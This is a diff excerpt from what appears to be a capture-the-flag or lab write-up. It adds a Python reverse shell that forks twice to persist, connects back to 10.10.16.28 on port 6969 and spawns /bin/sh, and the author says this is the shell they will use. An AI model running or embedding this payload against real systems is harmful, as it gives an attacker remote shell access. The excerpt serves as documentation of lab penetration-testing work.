@@ -491,3 +491,10 @@ I now have a shell, but this shell dies shorly after, probably because the proce
 
 To get around this i can use a different python reverse shell with persistence
 
+```python
+import socket,os,pty\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\nos.setsid()\npid=os.fork()\nif pid>0:\n import sys;sys.exit(0)\ns=socket.socket()\ns.connect((\"10.10.16.28\",6969))\n[os.dup2(s.fileno(), i) for i in(0,1,2)]\npty.spawn(\"/bin/sh\")
+```
+
+This is the shell i will use
+
+So it looks like  
